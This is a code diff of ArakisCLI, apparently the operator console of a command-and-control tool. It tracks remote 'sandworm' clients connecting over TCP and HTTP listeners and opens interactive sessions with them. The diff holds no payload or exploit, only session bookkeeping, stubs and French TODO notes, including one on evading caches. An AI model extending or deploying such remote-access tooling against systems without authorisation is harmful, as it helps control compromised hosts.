@@ -3,7 +3,7 @@ import logger
 import threading
 from tcp_server import CustomTCPServer
 from colorama import Fore, Style
-from sandworms import SandwormCLI  # Import the nested CLI
+from sandworms import TCPSandwormCLI  # Import the nested CLI
 from custom_http import HTTPHandler, HTTPServerWrapper
 
 class ArakisCLI(cmd.Cmd):
@@ -24,7 +24,8 @@ class ArakisCLI(cmd.Cmd):
         self.http_listeners = {} # Indexed by ID, values are HTTPServer instances
         self.http_listeners_count = 0
 
-        self.sandworms = {} # Connected clients
+        self.tcp_sandworms = {} # Connected TCP clients
+        self.http_sandworms = {} # Connected HTTP clients
         self.current_sandworm = None # Active client session
 
 
@@ -54,8 +55,8 @@ class ArakisCLI(cmd.Cmd):
         
         elif main_cmd == "sandworm":
             self.handle_sandworm_commands(sub_cmd, sub_args)
-        #elif main_cmd == "http":
-        #    self.handle_http_commands(sub_cmd, sub_args)
+        elif main_cmd == "http":
+            self.handle_http_commands(sub_cmd, sub_args)
         else:
             self.log.error(f"Unkown command: {line}. Type 'help' for usage.")
             print(Fore.YELLOW + f"[-] Unkown command: {line}." + Style.RESET_ALL + "Type 'help' for usage")
@@ -96,7 +97,7 @@ class ArakisCLI(cmd.Cmd):
         try:
             interface, port = ip, int(port)
             index = self.tcp_listeners_count
-            listener = CustomTCPServer(interface, port, index, self.on_new_sandworm)
+            listener = CustomTCPServer(interface, port, index, self.on_new_tcp_sandworm)
 
             
             self.tcp_listeners[index] = (listener,index)
@@ -203,6 +204,10 @@ class ArakisCLI(cmd.Cmd):
         print("  exit                    - Exit the CLI\n")
 
 
+    def handle_http_commands(self):
+        pass
+
+
     def create_http_listener(self, ip, port, secure=False, certfile=None, keyfile=None):
         """
         TODO : Pas obligé de spécifier secure si tu donne certfile et keyfile
@@ -285,8 +290,8 @@ class ArakisCLI(cmd.Cmd):
         if sub_cmd == "list":
             self.list_sandworms()
         
-        elif sub_cmd == "interact" and len(args) == 1:
-            self.interact_with_sandworm(args[0])
+        elif sub_cmd == "interact" and len(args) == 2:
+            self.interact_with_sandworm(args[0], args[1])
 
         elif sub_cmd == "help":
             self.sandworm_help()
@@ -300,28 +305,38 @@ class ArakisCLI(cmd.Cmd):
         List all connected sandworms
         """
 
-        if not self.sandworms:
+        if not self.tcp_sandworms and not self.http_sandworms:
             print(Fore.YELLOW + "[-] No active sandworm" + Style.RESET_ALL)
             return
         
         print(Fore.GREEN + "[+] Connected Sandworms :" + Style.RESET_ALL)
-        for index, client in self.sandworms.items():
+        print("[=>] TCP Sandworms : ")
+        for index, client in self.tcp_sandworms.items():
             print(Fore.YELLOW + f"[{index}]  Sandworm : {client['username']}@{client['hostname']}" + Style.RESET_ALL)
-            
 
-    def interact_with_sandworm(self, index):
+        print("[=>} HTTP Sandworms : ")
+        for index, client in self.http_sandworms.items():
+            print(Fore.YELLOW + f"[{index}]  Sandworm : {client['username']}@{client['hostname']}" + Style.RESET_ALL)
+
+
+    def interact_with_sandworm(self, index, type="tcp"):
         """
         Switch to interacting with a specific Sandworm
         """
         try:
             index = int(index)
-            if index not in self.sandworms:
-                self.log.error(f"Sandworm [{index}] not found.")
-                return
             
-            sandworm = self.sandworms[index]
-            sandworm_cli = SandwormCLI(index, sandworm, self)
-            sandworm_cli.cmdloop() # Start nested CLI
+            if type == "tcp":
+                if index not in self.tcp_sandworms:
+                    self.log.error(f"Sandworm [{index}] not found.")
+                    return
+                
+                sandworm = self.tcp_sandworms[index]
+                sandworm_cli = TCPSandwormCLI(index, sandworm, self)
+                sandworm_cli.cmdloop() # Start nested CLI
+            
+            elif type == "http":
+                pass
 
         except ValueError:
             self.log.error("Invalid index")
@@ -333,31 +348,46 @@ class ArakisCLI(cmd.Cmd):
         Example: help setup_tcp_listener
         """
         print("\nAvailable Commands:")
-        print("  sandworm help           - sandworm help message")
-        print("  sandworm list           - list connected sandworms")
-        print("  sandworm interact <id>  - interact with specified sandworm")
-        print("  sandworm delete <id>    - delete the specified sandworm")
-        print("  exit                    - Exit the CLI\n")
+        print("  sandworm help                  - sandworm help message")
+        print("  sandworm list                  - list connected sandworms")
+        print("  sandworm interact <type> <id>  - interact with specified sandworm (type = http or tcp)")
+        print("  sandworm delete <id>           - delete the specified sandworm")
+        print("  exit                           - Exit the CLI\n")
 
     
-    ### CALLBACK FUNCTION FOR NEW SANDWORM ###
-    def on_new_sandworm(self, index, hostname, username, client_socket, tcp_listener_index):
+    ### CALLBACK FUNCTION FOR NEW TCP SANDWORM ###
+    def on_new_tcp_sandworm(self, index, hostname, username, client_socket, tcp_listener_index):
         """
         This function is called when a new Sandworm connects.
         """
         
         print("\n" + Fore.GREEN + f"[+] New Sandworm connected {username}@{hostname}!" + Style.RESET_ALL)
 
-        self.sandworms[index] = {
+        self.tcp_sandworms[index] = {
             "socket": client_socket,
             "hostname": hostname,
             "username": username,
             "tcp_index": tcp_listener_index
         }
 
+
+    ### CALLBACK FUNCTION FOR NEW HTTP SANDWORM ###
+    def on_new_http_sandworm(self, index, ip, hostname, username, http_listener_index):
+        """
+        This function is called when a new HTTP sandworm connects
+        """
+        print("\n" + Fore.GREEN + f"[+] New Sandworm connected {username}@{hostname}!" + Style.RESET_ALL)
+
+        self.http_sandworms[index] = {
+            "ip":ip,
+            "hostname":hostname,
+            "username":username,
+            "http_index":http_listener_index
+        }
+
     
     ### CALLBACK FUNCTION WHEN CLIENT DISCONNECT (Pas encore mise au point, TODO)
-    def del_sandworm(self, index):
+    def del_sandworm(self, index, type="tcp"):
         """
         Delete the specified sandworm
         Example: sandworm delete 1
@@ -367,12 +397,13 @@ class ArakisCLI(cmd.Cmd):
         
         # TODO s'assurer qu'il y a une référence entre le sandworm et le serveur tcp
         # parce qu'on doit pouvoir fermer la connexion quand on détruit le sandworm
-
-        #if self.sandworms[index]["socket"]:
-        #    pass
         
-        del self.sandworms[index]
-
+        if type == "tcp":
+            del self.tcp_sandworms[index]
+        elif type == "http":
+            del self.http_sandworms[index]
+        else:
+            print(Fore.RED + "[-] Not a valid type (HTTP or TCP)" + Style.RESET_ALL)
 
     def do_help(self, arg):
         """
@@ -394,7 +425,7 @@ class ArakisCLI(cmd.Cmd):
             print("  http create <ip> <port>  - Create a new HTTP listener")
             print("  sandworm help           - sandworm help message")
             print("  sandworm list           - list connected sandworms")
-            print("  sandworm interact <id>  - interact with specified sandworm")
+            print("  sandworm interact <type> <id>  - interact with specified sandworm (type = http or tcp)")
             print("  exit                    - Exit the CLI\n")
 
 
@@ -435,6 +466,10 @@ Faire une option pour exécuter des commandes locales
     - id
     - cd
     - etc.
+
+
+IMPORTANT : 
+- Dans ton http, faire en sorte que ton client envoie toujours un paramètre aléatoire pour empêcher qu'il se fasse retourner une réponse du cache
 
 """
 if __name__ == '__main__':
